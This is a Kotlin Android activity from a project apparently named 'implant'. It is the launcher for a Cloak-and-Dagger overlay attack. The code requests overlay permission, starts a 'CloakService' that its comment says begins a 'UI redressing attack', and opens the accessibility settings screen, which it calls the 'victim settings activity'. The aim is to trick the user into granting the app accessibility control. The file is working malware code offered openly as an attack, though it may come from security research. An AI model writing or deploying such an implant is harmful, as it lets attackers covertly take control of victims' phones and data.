package com.cooperthecoder.implant

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.support.v7.app.AppCompatActivity


class MainActivity : AppCompatActivity() {

    private val REQUEST_CODE_OVERLAY = 5463

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (overlayPermissionRequired()) {
            val appUri = Uri.fromParts("package", packageName, null)
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, appUri)
            startActivityForResult(intent, REQUEST_CODE_OVERLAY)
        } else {
            startCloakService()
        }
    }

    private fun startCloakService() {
        // No need for the cloak if the dagger already came out
        if (!DaggerService.running) {
            // Start the cloak service to begin the UI redressing attack
            startService(Intent(this, CloakService::class.java))
            // Launch victim settings activity and close this activity.
            val flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .setFlags(flags))
            finish()
        }
    }

    private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
            startCloakService()
        }
    }
}
